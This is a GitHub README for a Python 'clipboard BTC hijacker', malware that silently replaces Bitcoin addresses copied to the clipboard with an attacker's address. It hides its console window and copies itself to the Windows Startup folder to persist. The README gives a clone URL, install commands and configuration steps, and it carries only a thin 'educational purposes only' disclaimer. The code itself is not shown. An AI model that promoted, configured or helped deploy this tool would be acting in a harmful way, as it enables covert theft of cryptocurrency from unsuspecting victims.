# Clipboard-BTC-Hijacker

## Overview
`Clipboard-BTC-Hijacker` is a Python script that demonstrates clipboard hijacking by monitoring and replacing Bitcoin addresses with a predefined target address. This script is intended for educational purposes only, to highlight potential security risks associated with clipboard manipulation.

## Features
- **Clipboard Monitoring**: Continuously checks clipboard content for Bitcoin addresses.
- **Address Replacement**: Replaces detected Bitcoin addresses with a predefined target address.
- **Startup Persistence**: Ensures the script runs on system startup by copying itself to the Startup folder.

## Installation

### Prerequisites
- Python 3.x
- `pywin32` library (for clipboard operations)

### Steps

1. **Clone the Repository:**
   ```bash
   git clone https://github.com/0xxnum/Clipboard-BTC-Hijacker.git
2. **Navigate to the Project Directory:**
  ```bash
   cd Clipboard-BTC-Hijacker
2. **Install Dependencies: Ensure you have the required Python libraries installed. You may need pywin32:**
  ```bash
   pip install pywin32
4. **Configure the Script: Edit the xnum_btc_replacer.py script to set your target Bitcoin address. Open xnum_btc_replacer.py and modify the target_btc_address variable.**
5. **Run the Script:**
  ```bash
   python xnum_btc_replacer.py

Usage
The script will hide the console window, copy itself to the Windows Startup folder for persistence, and continuously monitor the clipboard.
When a Bitcoin address is detected in the clipboard, it will be replaced with the predefined target address.

Disclaimer
This script is for educational purposes only. Unauthorized use of this tool for malicious activities is illegal and unethical. Always ensure you have proper authorization before using or testing this script.

License
This project is licensed under the MIT License - see the LICENSE file for details.
